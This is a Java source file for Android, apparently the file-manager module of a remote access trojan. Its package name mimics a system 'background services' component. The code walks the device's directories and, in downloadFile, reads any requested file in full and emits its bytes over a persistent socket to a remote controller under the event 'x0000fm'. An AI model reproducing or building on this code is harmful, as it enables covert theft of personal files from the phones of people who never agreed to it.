package com.android.background.services.helpers;

import android.util.Log;

import com.android.background.services.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.DecimalFormat;

public class FileManager {

    public static JSONArray walk(String path) {

        JSONArray values = new JSONArray();

        File dir = new File(path);

        if (!dir.canRead()) {
            Log.d("cannot", "inaccessible");
        }

        File[] list = dir.listFiles();

        try {
            if (list != null) {

                JSONObject parentObj = new JSONObject();

                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                parentObj.put("size", "0");

                values.put(parentObj);

                for (File file : list) {

                    JSONObject fileObj = new JSONObject();

                    fileObj.put("name", file.getName());
                    fileObj.put("isDir", file.isDirectory());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("size", fileSizeFormatter(file.length()));

                    values.put(fileObj);

                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file", true);
                object.put("name", file.getName());
                object.put("buffer", data);
                IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    public static String fileSizeFormatter(long size) {
        if (size <= 0) return "?";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return new DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }
}
